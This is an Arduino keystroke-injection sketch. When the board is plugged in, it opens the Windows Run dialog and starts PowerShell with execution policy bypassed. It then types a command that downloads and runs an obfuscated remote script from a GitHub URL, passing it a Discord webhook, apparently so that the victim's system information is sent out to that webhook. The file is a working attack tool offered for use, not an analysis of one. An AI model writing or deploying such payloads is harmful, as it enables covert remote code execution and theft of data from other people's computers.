#include <Keyboard.h>

const char* payload = "iex \"& {$(irm https://raw.githubusercontent.com/calinux-py/Arduino/refs/heads/main/systeminfo/obfu_systeminfo.ps1)} 'https://discordapp.com/api/webhooks/YOU_WEBHOOK'\"";

void setup() {
  Keyboard.begin();
  delay(2400); 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(800);
  Keyboard.print("powershell -NoP -ExecutionPolicy Bypass");
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print(payload);
  Keyboard.print("; exit");
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  Keyboard.end();
}

void loop() {}
